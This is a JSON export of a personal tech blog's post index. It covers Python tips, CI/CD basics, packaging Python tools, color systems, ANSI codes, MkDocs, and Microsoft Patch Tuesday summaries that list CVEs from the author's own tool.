[{"content":"","date":"2025-01-24 16:06","externalUrl":null,"permalink":"/tags/101/","section":"tags","summary":"","title":"101","type":"tags"},{"content":"","date":"2025-01-24 16:06","externalUrl":null,"permalink":"/categories/","section":"categories","summary":"","title":"categories","type":"categories"},{"content":" Never ever modify your list while iterating through the list. This post is taking from Indently\u0026rsquo;s shorts at https://www.youtube.com/shorts/X8KL7iAk-7k.\nList Item Removal # Suppose we want to remove an item within a list. Such as \u0026lsquo;B\u0026rsquo;.\nAnd below is one of the common mistakes that junior developer makes. It uses for-loop to remove the item while iterating through the list.\nBut the result shows an unexpected behavior here. See the code below.\nitems1 = [\u0026#39;A\u0026#39;, \u0026#39;B\u0026#39;, \u0026#39;C\u0026#39;, \u0026#39;D\u0026#39;, \u0026#39;E\u0026#39;] items2 = [] for item in items1: if item == \u0026#39;B\u0026#39;: items1.remove(\u0026#39;B\u0026#39;) else: items2.append(item) print(items2) # [\u0026#39;A\u0026#39;, \u0026#39;D\u0026#39;, \u0026#39;E\u0026#39;] Supposed we are expecting the result to be ['A', 'C', 'D', 'E']. If you want to modify the original list, simply create another list.\nAnd below here is the correct way.\nitems1 = [\u0026#39;A\u0026#39;, \u0026#39;B\u0026#39;, \u0026#39;C\u0026#39;, \u0026#39;D\u0026#39;, \u0026#39;E\u0026#39;] items2 = [ item for item in items1 if item != \u0026#39;B\u0026#39; ] print(items2) # [\u0026#39;A\u0026#39;, \u0026#39;C\u0026#39;, \u0026#39;D\u0026#39;, \u0026#39;E\u0026#39;] Links # Indently\u0026rsquo;s YT video at 10 Nooby Mistakes Devs Often Make In Python:\n","date":"2025-01-24 16:06","externalUrl":null,"permalink":"/posts/mistake_in_list_iteration/","section":"posts","summary":"Unexpected behaviour in your Python loops.","title":"Mistake in List Iteration","type":"posts"},{"content":"","date":"2025-01-24 16:06","externalUrl":null,"permalink":"/","section":"MySeq","summary":"","title":"MySeq","type":"page"},{"content":"","date":"2025-01-24 16:06","externalUrl":null,"permalink":"/posts/","section":"posts","summary":"","title":"posts","type":"posts"},{"content":"","date":"2025-01-24 16:06","externalUrl":null,"permalink":"/categories/posts/","section":"categories","summary":"","title":"Posts","type":"categories"},{"content":"","date":"2025-01-24 16:06","externalUrl":null,"permalink":"/tags/python/","section":"tags","summary":"","title":"python","type":"tags"},{"content":"","date":"2025-01-24 16:06","externalUrl":null,"permalink":"/tags/","section":"tags","summary":"","title":"tags","type":"tags"},{"content":" CI/CD pipeline is where you combine version control (Git), continuous integration and continuous deployment. An excellent page about CI/CD from Evan Grace (Tenable). See the full blog post in the link section.\nIMO, so far this is the only article to explain what is CI/CD well. This makes me to write a post about CI/CD for my own reference.\nThe post is about introducing Tenable Web Application Scanning. And this requires some level of understanding about:\nWhat is CI/CD pipeline? How webapp scanning works with CI/CD and version control? Continuous Integration # The Continuous Integration builds an application for testing and staging uses. It builds an application and runs tests on a schedule or after the code changes.\nDuring continuous integration, it involves:\nbuild and compile the source codes. run simple application testing. run dynamic application security testing (DAST). software composition analysis (SCA) static application security testing (SAST) Jenkins the first main and widely adopted CI tool. In short, it saves time to manually assign tasks out for multiple testings.\nContinuous Deployment # The Continuous Deployment builds an application for production use rather than just for quick testing.\nIt automates the process:\nDeploy codes from staging to production. Handle the roll-back if needed. In short, continuous deployment allows for changes to be made in the source code, and sent to production automatic. The purpose is to save time in changing live servers for IT team.\nWebApp Scan # Tenable Web Application Scanning can scan any pipeline, including: Bamboo CircleCI GitHub Actions GitLab Jenkins Azure DevOps Links # Web App Scanning 101 Tenable Web App Scanning CI/CD Application Scan Overview See the CI/CD Pipeline Scanning Demo ","date":"2024-12-19 12:55","externalUrl":null,"permalink":"/posts/cicd_pipeline/","section":"posts","summary":"CI/CD pipelines 101 for security pros.","title":"CI/CD Pipeline 101","type":"posts"},{"content":"","date":"2024-12-19 12:55","externalUrl":null,"permalink":"/tags/cicd/","section":"tags","summary":"","title":"cicd","type":"tags"},{"content":"","date":"2024-12-19 12:55","externalUrl":null,"permalink":"/tags/dast/","section":"tags","summary":"","title":"dast","type":"tags"},{"content":"","date":"2024-12-19 12:55","externalUrl":null,"permalink":"/tags/sast/","section":"tags","summary":"","title":"sast","type":"tags"},{"content":"","date":"2024-12-19 12:55","externalUrl":null,"permalink":"/tags/sca/","section":"tags","summary":"","title":"sca","type":"tags"},{"content":"","date":"2024-12-19 12:55","externalUrl":null,"permalink":"/tags/webapp/","section":"tags","summary":"","title":"webapp","type":"tags"},{"content":" Few ways to run Python tool without activating Python virtual environment. After we optimize main.py, we may continue to make it a standalone tool.\nAnd a lot of time, especially Python \u0026gt;3.12, we create our project with virtual environment venv module. This will require us to break the virtual environment to make it a standalone tool without depending on sets of libraries/modules.\nWe have a few options: use shebang directly or use OneFiler to convert it to a single binary.\nUse shebang # This is a straight forward method, and it is suitable for using it at the same machine.\nInstead of activating the virtual environment every time, we can directly call the Python interpreter within venv with shebang. Simply add the shebang line at the top of Python script as below:\n#!/patch/to/venv/bin/python Then, ensure the script has executable bit with chmod +x main.py.\nFinally, we can just run the Python script ./main.py.\nUse OneFiler # Using OneFiler simply means package the Python CLI application into a single binary using tools i\nPyInstaller: most common Nuitka: more optimized, faster execution shiv: for virtual environment-like bundle PyInstaller # This is most common tool used due to its simplicity.\nFirst, we need to setup PyInstaller.\n$ pip install pyinstaller --break-system-packages $ pyinstaller --version 6.11.1 Then, we can create the binary with the following:\n$ pyinstaller --onefile --collect-all pyfiglet patch_tuesday.py Finally, we can find the binary at dist/patch_tuesday.\nNuitka # Nuitka converts Python script into a C-based binary, and has the advantage of better performance.\nThis is because it transpiles Python code into C code and then compiles it into a native executable file. And to make the CLI app fully portable, use --standalone option, or the CLI app will depend on libraries that need to be installed.\nFirst, let\u0026rsquo;s setup Nuitka with the following:\n$ pip install nuitka --break-system-packages $ sudo apt install patchelf Then, create the binary.\n$ python3 -m nuitka --onefile --standalone patch_tuesday.py Finally, we can find the binary at patch_tuesday.bin.\nShiv # Shiv can bundle our app into a zipapp than can run as a single file. But it still depends on a compatible Python interpreter. Thus, it is for a more portable Python-based package.\nHere, we simply create a pyz of shiv using shiv!!\n$ mkdir standalone $ cd standalone $ python3 -m venv ../venv/standalone $ source ../venv/standalone/bin/activate (standalone) $ pip install shiv (standalone) $ shiv -c shiv -o shiv shiv (standalone) $ deactivate $ ./shiv You must supply PIP ARGS or --site-packages! Links # Patch_Tuesday Utils ","date":"2024-12-17 12:12","externalUrl":null,"permalink":"/posts/break_venv/","section":"posts","summary":"Making standalone tool from Python virtual environment.","title":"Break the Virtual Environment","type":"posts"},{"content":"","date":"2024-12-17 12:12","externalUrl":null,"permalink":"/tags/py-venv/","section":"tags","summary":"","title":"py-venv","type":"tags"},{"content":" Summarizing from https://msrc.microsoft.com/update-guide/releaseNote/2024-Dec. Key Takeways # In December 2024, Microsoft released 74 CVEs as part of their Patch Tuesday updates.\n78 newly disclosed vulnerabilities in Dec 2024 release (including non-MS CVEs). Total of 1 CVE found in CISA_KEV and exploited in wild. 30 remote code execution vulnerabilities (most impactful type). 16 (22.9%) CVEs have been rated as Critical, and 54 been rated as Important. Total of 76 CVEs that require customer action. (New metric starting in Aug 2024) Highlights # CVE-2024-49138: Windows Common Log File System Driver Elevation of Privilege Vulnerability CVE-2024-49070: Microsoft SharePoint Remote Code Execution Vulnerability CVE-2024-49118, CVE-2024-49122: Microsoft Message Queuing (MSMQ) Remote Code Execution Vulnerability 9 CVEs: Windows Remote Desktop Services Remote Code Execution Vulnerability \u0026ldquo;Playback on other website has been disabled.\u0026rdquo; by Microsoft Security. Thus, watch the video at YouTube instead.\nPatch_Tuesday # Here, you can run the tool manually for your own analysis.\n$ ./patch_tuesday.py -k 2024-dec -vc ___ __ __ ______ __ / _ \\___ _/ /_____/ / /_ __/_ _____ ___ ___/ /__ ___ __ / ___/ _ `/ __/ __/ _ \\_ / / / // / -_|_-\u0026lt;/ _ / _ `/ // / /_/ \\_,_/\\__/\\__/_//_(_)_/ \\_,_/\\__/___/\\_,_/\\_,_/\\_, / /___/ [*] Finish fetching [4,001,593 bytes] from https://api.msrc.microsoft.com/cvrf/v3.0/cvrf/2024-dec [*] CISA Catalog of Known Exploited Vulnerabilities [ 2024.12.13/1229 ] Microsoft Patch Tuesday - By MSRC =============================================== \u0026lt;\u0026lt; December 2024 Security Updates [ 2024-12-10 ] \u0026gt;\u0026gt; [+] Vulnerabilities : [ 78 ] [-] High_Severity : [ 10 ] [-] High_likelihood : [ 6 ] [-] Exploited in_wild : [ 1 ] [-] Action_required : [ 76 ] [-] Found in CISA_KEV : [ 1 ] High_Severity/10 ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ ┃ CVE ┃ CVSS_Base/Temp ┃ Title_Value ┃ ┡━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩ │ CVE-2024-49085 │ B:8.8/T:7.7 │ Windows Routing and Remote Access Service (RRAS) Remote Code Execution Vulnerability │ │ CVE-2024-49086 │ B:8.8/T:7.7 │ Windows Routing and Remote Access Service (RRAS) Remote Code Execution Vulnerability │ │ CVE-2024-49093 │ B:8.8/T:7.7 │ Windows Resilient File System (ReFS) Elevation of Privilege Vulnerability │ │ CVE-2024-49102 │ B:8.8/T:7.7 │ Windows Routing and Remote Access Service (RRAS) Remote Code Execution Vulnerability │ │ CVE-2024-49104 │ B:8.8/T:7.7 │ Windows Routing and Remote Access Service (RRAS) Remote Code Execution Vulnerability │ │ CVE-2024-49117 │ B:8.8/T:7.7 │ Windows Hyper-V Remote Code Execution Vulnerability │ │ CVE-2024-49125 │ B:8.8/T:7.7 │ Windows Routing and Remote Access Service (RRAS) Remote Code Execution Vulnerability │ │ CVE-2024-49147 │ B:9.3/T:8.4 │ Microsoft Update Catalog Elevation of Privilege Vulnerability │ │ CVE-2024-49080 │ B:8.8/T:7.7 │ Windows IP Routing Management Snapin Remote Code Execution Vulnerability │ │ CVE-2024-49112 │ B:9.8/T:8.5 │ Windows Lightweight Directory Access Protocol (LDAP) Remote Code Execution Vulnerability │ └────────────────┴────────────────┴──────────────────────────────────────────────────────────────────────────────────────────┘ High_Likelihood/6 ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ ┃ CVE ┃ CVSS_Base/Temp ┃ Title_Value ┃ ┡━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩ │ CVE-2024-49070 │ B:7.4/T:6.4 │ Microsoft SharePoint Remote Code Execution Vulnerability │ │ CVE-2024-49093 │ B:8.8/T:7.7 │ Windows Resilient File System (ReFS) Elevation of Privilege Vulnerability │ │ CVE-2024-49122 │ B:8.1/T:7.1 │ Microsoft Message Queuing (MSMQ) Remote Code Execution Vulnerability │ │ CVE-2024-49088 │ B:7.8/T:6.8 │ Windows Common Log File System Driver Elevation of Privilege Vulnerability │ │ CVE-2024-49090 │ B:7.8/T:6.8 │ Windows Common Log File System Driver Elevation of Privilege Vulnerability │ │ CVE-2024-49114 │ B:7.8/T:6.8 │ Windows Cloud Files Mini Filter Driver Elevation of Privilege Vulnerability │ └────────────────┴────────────────┴─────────────────────────────────────────────────────────────────────────────┘ Exploited_in_Wild/1 ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ ┃ CVE ┃ CVSS_Base/Temp ┃ Title_Value ┃ ┡━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩ │ CVE-2024-49138 │ B:7.8/T:6.8 [K] │ Windows Common Log File System Driver Elevation of Privilege Vulnerability │ └────────────────┴─────────────────┴────────────────────────────────────────────────────────────────────────────┘ [+] Product Families (8) Windows ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇ 29 Microsoft Office ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇ 23 ESU ▇▇▇▇▇▇▇ 10 Mariner ▇▇▇▇ 6 System Center ▇▇▇ 5 Browser ▇ 1 Apps ▇ 1 Developer Tools ▇ 1 [*] \u0026#34;December 2024 Security Updates\u0026#34; (Rev 179) [-] Initial Release date: 2024-12-10T08:00:00 [-] Current Release date: 2024-12-16T00:00:00 Outro # Tool: Patch_Tuesday at GitHub. ","date":"2024-12-15 16:36","externalUrl":null,"permalink":"/posts/2024_dec/","section":"posts","summary":"$ ./patch_tuesday.py -k 2024-dec -vc","title":"Patch Tuesday (2024-12)","type":"posts"},{"content":"","date":"2024-12-15 16:36","externalUrl":null,"permalink":"/tags/patchtuesday/","section":"tags","summary":"","title":"patchtuesday","type":"tags"},{"content":"","date":"2024-12-09 12:12","externalUrl":null,"permalink":"/tags/code/","section":"tags","summary":"","title":"code","type":"tags"},{"content":" It is recommended to optimize our main.py before sending for static code analysis. Optimization # Code Optimization is a practice to make the code more efficient, use less resources while producing the right results.\nIt has the benefits of:\nSpeed up the app performance Make the code cleaner and readable Simplify for error tracking and debugging Save computational power Many tools are created to help Python developer to optimize the code. For the most optimum result, simply combine the tools by chaining them.\nHere, I just share a few tools that help in highlighting any Unused Imports:\nflake8 - To detect unused imports. autoflake - To remove unused imports. isort - To sort and organize imports. pylint - To analyze code for other issues, including unused imports. Use these tools together can keep the main.py cleaner, optimized, and free of unnecessary imports.\nUse flake8 # flake8 is a popular tool for checking Python code style and errors. With the flake8-unused-import plugin, we can detect unnecessary imports.\nFirst, is to install flake8.\n$ pip install flake8 Then, just run the tool with:\n$ flake8 main.py main.py:4:1: F401 \u0026#39;sys\u0026#39; imported but unused Use autoflake # autoflake is a great tool to remove unused imports and variables automatically.\nFirst, is to install autoflake.\n$ pip install autoflake And, run autoflake to check and fix unused imports in main2.py:\n$ autoflake --check main2.py $ autoflake --remove-unused-variables --remove-all-unused-imports --in-place main2.py Use isort # isort is a tool that sorts and organizes imports to follow best practices. It can:\nremove duplicate imports. group standard library, third-party, and local imports. ensure consistent import order. Simply, install and run it with:\n$ pip install isort $ isort main3.py Use pylint # pylint is a comprehensive static code analysis tool that also detects unused imports.\nFirst, install pylint.\n$ pip install pylint Then, run pylint and looks for unused-import warnings in the output.\n$ pylint main3.py | grep unused main3.py:4:0: W0611: Unused import sys (unused-import) Optimum Results # For best results, simply chains the commands together:\n$ autoflake --remove-all-unused-imports --in-place main4.py \u0026amp;\u0026amp; isort main4.py \u0026amp;\u0026amp; pylint main4.py ","date":"2024-12-09 12:12","externalUrl":null,"permalink":"/posts/optimize_main/","section":"posts","summary":"Tips to optimize Python code.","title":"Optimize main.py","type":"posts"},{"content":"","date":"2024-12-09 12:12","externalUrl":null,"permalink":"/tags/tips/","section":"tags","summary":"","title":"tips","type":"tags"},{"content":"","date":"2024-12-09 12:12","externalUrl":null,"permalink":"/tags/tools/","section":"tags","summary":"","title":"tools","type":"tags"},{"content":"","date":"2024-12-08 01:13","externalUrl":null,"permalink":"/categories/blogger/","section":"categories","summary":"","title":"Blogger","type":"categories"},{"content":"","date":"2024-12-08 01:13","externalUrl":null,"permalink":"/tags/pptx/","section":"tags","summary":"","title":"pptx","type":"tags"},{"content":" Some of the presentations that I shared in the past. Title Presentation YYYY.MM 10 Immutable Laws of Security A presentation1 to customer. 2005.08 Real men use TCPDump Under construction. 2006.01 Real men use OpenSSL Under construction. 2006.01 Use command line (cli) like a man Under construction. 2006.02 Protect HTTP traffic without HTTPS Under construction. 2006.03 Know the Cookies Monster Under construction. 2006.04 All the content is hosted at GitHub repo.\nThe presentation is based on the 10 Immutable Laws of Security that published by Microsoft TechNet in 2000.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2024-12-08 01:13","externalUrl":null,"permalink":"/presentations/","section":"MySeq","summary":"$ wall Join the presentation. It is started.","title":"Presentations","type":"page"},{"content":"","date":"2024-12-02 11:47","externalUrl":null,"permalink":"/tags/color/","section":"tags","summary":"","title":"color","type":"tags"},{"content":" In summary, the most effective color systems are red-green-blue for additive color systems and cyan-magenta-yellow for subtractive color systems. This article is my cliff note based on Chris\u0026rsquo;s blog post at Why are red, yellow, and blue the primary colors in painting but computer screens use red, green, and blue?\nThe effectiveness of a color system is best measured as the number of different colors that can be created by mixing the primary colors of the system. This set of colors is called the \u0026ldquo;color gamut\u0026rdquo; of the system. A color system with a large gamut is more able to effectively represent a wide variety of images containing different colors.\nEffective Color System # The most effective color systems are those that closely match the physical workings of the human eye.\nThe human eye contains a curved array of light-sensing cells shaped like little cones and rods. Colored light is detected by the cone cells.\nThe cone cells come in three varieties: red-detecting, green-detecting, and blue-detecting.\nThey are so named because the red cone cells mostly detect red light, the green cone cells mostly detect green light, and the blue cone cells mostly detect blue light.\nNote that even though a red cone cell predominantly detects the color red, it can also detect a little bit of some other colors.\nTherefore, even though humans do not have yellow cone cells, we can still see yellow light when it triggers a red cone cell and a green cone cell.\nIn this way, humans have a built-in color decoding mechanism which enables us to experience millions of colors, although we only have vision cells that predominantly see red, green, and blue.\nIt should be obvious at this point that the most effective color systems are ones that closely match the human eye, i.e. color systems that mix red, green, and blue light.\nNext, we need to know that there are really two main ways to create a light beam or light sources.\nWe can either create the light directly using light sources or we can reflect white light off of a material that absorbs certain colors.\n2 Light Sources # There are two (2) equally-valid methods for creating color: additive systems and subtractive systems.\nAn additive system that creates red, green, and blue light and. A subtractive system that creates red, green, and blue light. Additive System # For an additive system, light is created directly. This means that the primary colors of the most effective additive color system are simply red, green, and blue (RGB). For example, computer screens, iPods and televisions, contain a grid of little red-, green-, and blue-emitting light sources.\nA system that creates light directly is called an \u0026ldquo;additive\u0026rdquo; color system since the colors from the different light sources add together to give the final beam of light.\nEach image pixel of a computer screen is just a small collection of light sources emitting different colors. If you display an image of a pumpkin on your computer screen, you have not really turned on any orange-emitting light sources in the screen.\nRather, you have turned on tiny red-emitting light sources as well as tiny green-emitting light sources in the screen, and the red and green light add together to make orange.\nSubtractive System # For a subtractive color system, a certain reflected color is obtained by absorbing the opposite color. And the primary colors of the most effective subtractive system are the opposites of red, green, and blue, which happen to be cyan, magenta, and yellow (CMY). This is why most printed images contain a grid of little cyan, magenta, and yellow dots of ink. Cyan is the opposite of red and is halfway between green and blue. Magenta is the opposite of green and is halfway between blue and red, and yellow is the opposite of blue and is halfway between red and green.\nIn contrast to an additive system, color systems that remove colors through absorption are called \u0026ldquo;subtractive\u0026rdquo; color systems. They are called this because the final color is achieved by starting with white light (which contains all colors) and then subtracting away certain colors, leaving other colors.\nExamples of subtractive color systems are paints, pigments, and inks. An orange pumpkin that you see printed in a newspaper is not necessarily created by spraying orange ink on the paper.\nRather, yellow ink and magenta ink are sprayed onto the paper. The yellow ink absorbs blue light and a little green and red from the white light beam, while the magenta ink absorbs green light and a little blue and red, leaving only orange to be reflected back.\nHuman Eyes # The color system that best matches the human eye is the red-green-blue color system.\nFor additive color systems like computer screens, the primary colors of this type of system are red, green, and blue. For subtractive color systems like inks, the primary colors of this type of system are the opposites of red, green, and blue, which are cyan, magenta, and yellow.\nThe red-yellow-blue painting color system is effectively a corruption of the cyan-magenta-yellow system, since cyan is close to blue and magenta is close to red.\nSee, usually additive colors/RGB are shown on black-background. (so that it absord and not relecting the colors) And subtractive colors/CYM are shown on a white-background.\n","date":"2024-12-02 11:47","externalUrl":null,"permalink":"/notes/color_system/","section":"notes","summary":"Why are red, yellow, and blue the primary colors in painting but computer screens use red, green, and blue?","title":"Color System","type":"notes"},{"content":"","date":"2024-12-02 11:47","externalUrl":null,"permalink":"/notes/","section":"notes","summary":"","title":"notes","type":"notes"},{"content":"","date":"2024-12-02 11:47","externalUrl":null,"permalink":"/categories/notes/","section":"categories","summary":"","title":"Notes","type":"categories"},{"content":"","date":"2024-11-28 18:18","externalUrl":null,"permalink":"/tags/ansi/","section":"tags","summary":"","title":"ansi","type":"tags"},{"content":"","date":"2024-11-28 18:18","externalUrl":null,"permalink":"/authors/","section":"authors","summary":"","title":"authors","type":"authors"},{"content":"","date":"2024-11-28 18:18","externalUrl":null,"permalink":"/tags/fun/","section":"tags","summary":"","title":"fun","type":"tags"},{"content":" New util to find the closest ANSI color code with Hex value. We all love cli and colorful console for our terminal.\nInitially, I was customizing my zsh shell prompt for different color combination. And I learnt about ANSI code in more details.\nANSI/RGB # There are 3 types of ANSI color codes. And here\u0026rsquo;s the breakdown:\n16-color Palette:\nANSI codes 30-37 and 90-97 represent a 16-color palette. Each color has a specific RGB value. 256-color Palette:\nANSI codes 38;5;0-255 represent a 256-color palette. This includes the 16-color palette, 216 colors formed by combining 6 levels of red, green, and blue, and 24 greyscale colors. Total 256 possible colors (16x Basic + 216x RGB + 24x Grayscale). print(f'\\033[38;5;{0~255}m256-color ANSI code\\033[0m') Truecolor ANSI code\nANSI codes 38;2;R;G;B represents true color (R,G,B are int from 0 to 255). HTML Hex code color is represented in truecolor, such as #a1e335. Total of 16,777,216 possible colors (256x256x256). print(f'\\033[38;2;{0~255};{0~255};{0~255}m16M-color ANSI code\\033[0m') Euclidean Distant # In math, Euclidean distance is the method to calculate the distant between two points. The 2 points can be one-dimension, two-dimension or more. In this case, we are calculating the RGB which is three-dimension.\nThere is no direct 1x1 mapping between all ANSI codes and true RGB colors. But there is direct mapping between RGB and true RGB.\nThus, our goal is to find the approximate ANSI code by go with the closest RGB code.\nPseudocode # Here\u0026rsquo;s the pseudocode:\nGenerate a dict to store mapping between ANSI code (256-color palette) and corresponding RGB values. Based on the input value (hex_code), calculate the closest distant (using Euclidean). Print the output with sample color/code. Finally, I put everything in Python script called find_closest_ansi.py. It is at the following repo at GitHub.\nmyseq/utils some ultilities Python 0 0 ","date":"2024-11-28 18:18","externalUrl":null,"permalink":"/posts/hex_ansicode/","section":"posts","summary":"To get the closest ANSI code based on color code in hexidecimal (for fun).","title":"Get ANSI Code with Euclidean Distant","type":"posts"},{"content":"","date":"2024-11-28 18:18","externalUrl":null,"permalink":"/authors/xx/","section":"authors","summary":"","title":"xx","type":"authors"},{"content":" nginx + mkdocs == localweb Finished setup a localweb repo by installing nginx and mkdocs today.\nlocalweb ├── config ├── docs │ └── assets ├── site │ ├── assets │ │ ├── images │ │ ├── javascripts │ │ │ ├── lunr │ │ │ │ └── min │ │ │ └── workers │ │ └── stylesheets │ ├── mkdocs │ ├── nginx │ └── search └── webroot └── site -\u0026gt; ../site ","date":"2024-11-26 22:22","externalUrl":null,"permalink":"/posts/localweb/","section":"posts","summary":"A local/online indexing web server.","title":"Local Web","type":"posts"},{"content":"","date":"2024-11-26 22:22","externalUrl":null,"permalink":"/tags/mkdocs/","section":"tags","summary":"","title":"mkdocs","type":"tags"},{"content":"","date":"2024-11-26 22:22","externalUrl":null,"permalink":"/tags/nginx/","section":"tags","summary":"","title":"nginx","type":"tags"},{"content":"","date":"2024-11-26 22:22","externalUrl":null,"permalink":"/tags/pandoc/","section":"tags","summary":"","title":"pandoc","type":"tags"},{"content":"","date":"2024-11-23 16:57","externalUrl":null,"permalink":"/tags/documentation/","section":"tags","summary":"","title":"documentation","type":"tags"},{"content":"","date":"2024-11-23 16:57","externalUrl":null,"permalink":"/tags/markdown/","section":"tags","summary":"","title":"markdown","type":"tags"},{"content":" MkDocs is static site generator designed for building project documentation. It is fast and lightweight and written in Python. Today I encounter a tool called MkDocs while studying diagram-as-code.\nJust like Hugo, mkdocs is also a static site generator that designed for building project documentation. It converts my markdown (.md) files into HTML pages.\nTutorial # To get start, follow the video (by James). Or simply check out the his blog post at Getting Started with Material for MkDocs.\nBy following the video and blog post, I manage to complete a project:\nCreate all the contents as markdown files (.md). Setup dynamic colour scheme. Customizing icons, logos, custom code blocks, content tabs, and more. Finally, upload the GitHub repo. From now on, I can use markdown to quickly create a beautiful documentation page for my projects.\nMkDocs is easy to use and simple to learn. Here are the commands needed to build my first documentation project.\n$ mkdocs new . $ mkdocs serve -a 0.0.0.0:8000 $ mkdocs build Links # James blog post: Getting Started with Material for MkDocs Material for MkDocs ","date":"2024-11-23 16:57","externalUrl":null,"permalink":"/posts/mkdocs/","section":"posts","summary":"Documenting project with MkDocs.","title":"MkDocs (Python)","type":"posts"},{"content":"","date":"2024-11-23 16:57","externalUrl":null,"permalink":"/authors/zd/","section":"authors","summary":"","title":"zd","type":"authors"},{"content":" Summarizing from https://msrc.microsoft.com/update-guide/releaseNote/2024-Nov. Key Takeways # In November 2024, Microsoft released 103 CVEs as part of their Patch Tuesday updates.\n89 newly disclosed vulnerabilities in Nov 2024 release. Total of 2 CVEs found in CISA_KEV and exploited in wild. 52 remote code execution vulnerabilities (most impactful type). Highest CVSS scored vulnerability is 9.9. SQL Server: There are 31 vulnerabilities in SQL Server, all of which are rated 8.8. Exchange: There is one vulnerability in Exchange, CVE-2024-4904, which is an important spoofing vulnerability. Total of 102 CVEs that require customer action. (New metric starting in Aug 2024) Highlights # CVE-2024-43451: NTLM Hash Disclosure Spoofing Vulnerability CVE-2024-49039: Windows Task Scheduler Elevation of Privilege Vulnerability CVE-2024-43639: A critical remote code execution vulnerability in Windows Server. CVE-2024-38255: SQL Server, CVSS 8.8 CVE-2024-43447: Windows SMBv3 Client/Server, CVSS 8.1 CVE-2024-43498: .NET and Visual Studio, CVSS 9.8 CVE-2024-43602: Azure CycleCloud, CVSS 9.9 Video is added later on Nov 19.\nPatch_Tuesday # $ ./patch_tuesday.py -k 2024-nov -vc ___ __ __ ______ __ / _ \\___ _/ /_____/ / /_ __/_ _____ ___ ___/ /__ ___ __ / ___/ _ `/ __/ __/ _ \\_ / / / // / -_|_-\u0026lt;/ _ / _ `/ // / /_/ \\_,_/\\__/\\__/_//_(_)_/ \\_,_/\\__/___/\\_,_/\\_,_/\\_, / /___/ [*] Finish fetching [3,064,834 bytes] from https://api.msrc.microsoft.com/cvrf/v3.0/cvrf/2024-nov [*] CISA Catalog of Known Exploited Vulnerabilities [ 2024.11.18/1217 ] Microsoft Patch Tuesday - By MSRC =============================================== \u0026lt;\u0026lt; November 2024 Security Updates [ 2024-11-12 ] \u0026gt;\u0026gt; [+] Vulnerabilities : [ 103 ] [-] High_Severity : [ 43 ] [-] High_likelihood : [ 9 ] [-] Exploited in_wild : [ 2 ] [-] Action_required : [ 102 ] [-] Found in CISA_KEV : [ 2 ] High_Severity/43 ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ ┃ CVE ┃ CVSS_Base/Temp ┃ Title_Value ┃ ┡━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩ │ CVE-2024-43602 │ B:9.9/T:8.6 │ Azure CycleCloud Remote Code Execution Vulnerability │ │ CVE-2024-43627 │ B:8.8/T:7.7 │ Windows Telephony Service Remote Code Execution Vulnerability │ │ CVE-2024-43628 │ B:8.8/T:7.7 │ Windows Telephony Service Remote Code Execution Vulnerability │ │ CVE-2024-38255 │ B:8.8/T:7.7 │ SQL Server Native Client Remote Code Execution Vulnerability │ │ CVE-2024-43459 │ B:8.8/T:7.7 │ SQL Server Native Client Remote Code Execution Vulnerability │ │ CVE-2024-43462 │ B:8.8/T:7.7 │ SQL Server Native Client Remote Code Execution Vulnerability │ │ CVE-2024-48994 │ B:8.8/T:7.7 │ SQL Server Native Client Remote Code Execution Vulnerability │ │ CVE-2024-48995 │ B:8.8/T:7.7 │ SQL Server Native Client Remote Code Execution Vulnerability │ │ CVE-2024-48996 │ B:8.8/T:7.7 │ SQL Server Native Client Remote Code Execution Vulnerability │ │ CVE-2024-5535 │ B:9.1/T:8.7 │ OpenSSL: CVE-2024-5535 SSL_select_next_proto buffer overread │ │ CVE-2024-43498 │ B:9.8/T:8.5 │ .NET and Visual Studio Remote Code Execution Vulnerability │ │ CVE-2024-43620 │ B:8.8/T:7.7 │ Windows Telephony Service Remote Code Execution Vulnerability │ │ CVE-2024-43621 │ B:8.8/T:7.7 │ Windows Telephony Service Remote Code Execution Vulnerability │ │ CVE-2024-43622 │ B:8.8/T:7.7 │ Windows Telephony Service Remote Code Execution Vulnerability │ │ CVE-2024-43624 │ B:8.8/T:7.7 │ Windows Hyper-V Shared Virtual Disk Elevation of Privilege Vulnerability │ │ CVE-2024-43635 │ B:8.8/T:7.7 │ Windows Telephony Service Remote Code Execution Vulnerability │ │ CVE-2024-48993 │ B:8.8/T:7.7 │ SQL Server Native Client Remote Code Execution Vulnerability │ │ CVE-2024-48997 │ B:8.8/T:7.7 │ SQL Server Native Client Remote Code Execution Vulnerability │ │ CVE-2024-48998 │ B:8.8/T:7.7 │ SQL Server Native Client Remote Code Execution Vulnerability │ │ CVE-2024-48999 │ B:8.8/T:7.7 │ SQL Server Native Client Remote Code Execution Vulnerability │ │ CVE-2024-49000 │ 